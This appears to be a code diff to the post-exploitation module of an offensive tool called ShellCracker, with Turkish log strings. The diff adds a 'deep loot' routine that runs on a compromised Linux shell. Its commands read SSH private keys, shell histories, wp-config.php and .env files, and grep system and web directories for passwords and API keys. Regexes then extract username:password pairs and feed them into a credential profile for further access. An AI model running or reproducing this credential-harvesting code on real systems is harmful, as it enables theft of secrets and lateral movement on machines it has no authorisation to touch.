@@ -33,6 +33,37 @@ from . import tools
 
 logger = logging.getLogger("ShellCracker.postexp")
 
+# Read-only loot sweep for a Linux shell: high-value artefacts an operator
+# would otherwise grep for by hand. Every command is bounded (head/tail) and
+# never writes to the target. Globs cover the usual home/web/app locations.
+_LOOT_CMDS: dict[str, str] = {
+    "ssh_keys": "cat /root/.ssh/id_* /home/*/.ssh/id_* 2>/dev/null",
+    "authorized_keys":
+        "cat /root/.ssh/authorized_keys /home/*/.ssh/authorized_keys 2>/dev/null",
+    "history":
+        "tail -n 40 /root/.bash_history /home/*/.bash_history 2>/dev/null",
+    "app_configs":
+        "cat /var/www/html/wp-config.php /var/www/*/wp-config.php "
+        "/var/www/*/.env /var/www/html/.env /opt/*/.env "
+        "/var/www/*/config.php 2>/dev/null",
+    "config_creds":
+        "grep -rIis -m 40 -E 'pass(word)?|secret|api[_-]?key|DB_' "
+        "/var/www /opt /etc 2>/dev/null | head -n 40",
+    "interesting_files":
+        "find /home /root /opt /var/www -maxdepth 4 -type f "
+        "\\( -name '*.conf' -o -name 'id_rsa' -o -name '*.pem' "
+        "-o -name 'credentials*' -o -name '*.kdbx' -o -name '.env' \\) "
+        "2>/dev/null | head -n 40",
+}
+
+# Key names in config/env output whose value is a username / a password.
+_USER_RE = re.compile(
+    r"(?:user(?:name)?|db_user|login)['\"]?\s*[:=,>\)]+\s*['\"]?([^\s'\"]{1,64})",
+    re.I)
+_PASS_RE = re.compile(
+    r"(?:pass(?:word)?|passwd|pwd|db_pass(?:word)?)['\"]?\s*[:=,>\)]+\s*"
+    r"['\"]?([^\s'\"]{1,64})", re.I)
+
 # SUID binaries that are well-known privilege-escalation primitives (GTFOBins).
 _GTFO_SUID = {
     "nmap", "vim", "find", "bash", "more", "less", "nano", "cp", "mv", "awk",
@@ -87,6 +118,7 @@ class PostExploiter:
         cfg = (config or {}).get("post_exploitation", {}) or {}
         self.enabled = bool(cfg.get("enabled", True))
         self.do_loot = bool(cfg.get("loot", True))
+        self.deep_loot = bool(cfg.get("deep_loot", True))
         self.do_suggester = bool(cfg.get("privesc_suggester", True))
         self.auto_escalate = bool(cfg.get("auto_escalate", True))
         self.crack_hashes = bool(cfg.get("crack_hashes", True))
@@ -196,6 +228,72 @@ class PostExploiter:
         if loot.get("writable_cron", "") and "rwx" in loot.get("writable_cron", "").lower():
             out.append("Yazilabilir cron dosyasi -> zamanlanmis gorev ile root.")
         return out
+
+    # -- sensitive-file loot -------------------------------------------------
+    @staticmethod
+    def _extract_config_creds(text: str) -> list[tuple[str, str]]:
+        """Pull (user, password) pairs out of looted config/env/grep output.
+
+        Best-effort: passwords are the signal, usernames are paired positionally
+        when present (``?`` otherwise). Noise values are filtered out so the
+        engine is not fed template placeholders.
+        """
+        if not text or text.startswith("[hata"):
+            return []
+        noise = {
+            "", "password", "your_password", "changeme", "xxx", "none", "null",
+            "example", "secret", "putyourpasswordhere", "password_here",
+        }
+        users = [u for u in _USER_RE.findall(text) if u.lower() not in noise]
+        passwords = [p for p in _PASS_RE.findall(text)
+                     if p.lower() not in noise and len(p) >= 3]
+        pairs: list[tuple[str, str]] = []
+        seen: set[tuple[str, str]] = set()
+        for i, pw in enumerate(passwords):
+            user = users[i] if i < len(users) else (users[0] if users else "?")
+            pair = (user, pw)
+            if pair not in seen:
+                seen.add(pair)
+                pairs.append(pair)
+        return pairs
+
+    def _deep_loot(self, session: Any, result: PostExpResult, profile: Any = None) -> None:
+        """Sweep a Linux shell for keys, histories and config credentials."""
+        found_secret = False
+        for label, cmd in _LOOT_CMDS.items():
+            out = self._sh(session, cmd)
+            self.result_cmd(result, cmd)
+            if out and not out.startswith("[hata") and out.strip():
+                result.loot[label] = out[:4000]
+                if label in ("ssh_keys", "app_configs", "config_creds"):
+                    found_secret = True
+
+        if result.loot.get("ssh_keys", "").strip():
+            result.notes.append(
+                "SSH ozel anahtari bulundu -> anahtarla yanal hareket/erisim.")
+
+        # Harvest credentials out of whatever config/env we read.
+        blob = "\n".join(
+            result.loot.get(k, "") for k in ("app_configs", "config_creds"))
+        creds = self._extract_config_creds(blob)
+        if creds:
+            shown = ", ".join(f"{u}:{p}" for u, p in creds[:8])
+            result.notes.append(f"Konfiglardan {len(creds)} kimlik: {shown}")
+            result.loot["config_creds_parsed"] = "\n".join(
+                f"{u}:{p}" for u, p in creds)
+            for u, p in creds:
+                logger.info("  konfig kimligi: %s:%s", u, p)
+                if profile is not None:
+                    profile.add_credential("config", 0, u, p)
+        elif found_secret:
+            result.notes.append("Hassas dosyalar bulundu (loot bolumune bak).")
+
+    @staticmethod
+    def result_cmd(result: PostExpResult, cmd: str) -> None:
+        """Record a run command (short label) without duplicating noise."""
+        label = cmd.split("2>")[0].strip()[:48]
+        if label and label not in result.commands_run:
+            result.commands_run.append(label)
 
     # -- offline hash cracking ----------------------------------------------
     @staticmethod
@@ -342,6 +440,13 @@ class PostExploiter:
                     result.commands_run.append("cat /etc/passwd")
 
             result.privesc_suggestions = self._suggest_linux(result.loot)
+
+            # Deep loot: keys, histories, config credentials (shell sessions).
+            if self.do_loot and self.deep_loot:
+                try:
+                    self._deep_loot(session, result, profile)
+                except Exception as exc:  # noqa: BLE001 - loot must never break triage
+                    logger.debug("deep loot hatasi: %s", exc)
 
         # Offline-crack whatever hashes we looted (NT from hashdump, unix shadow).
         if self.crack_hashes and self.do_loot:
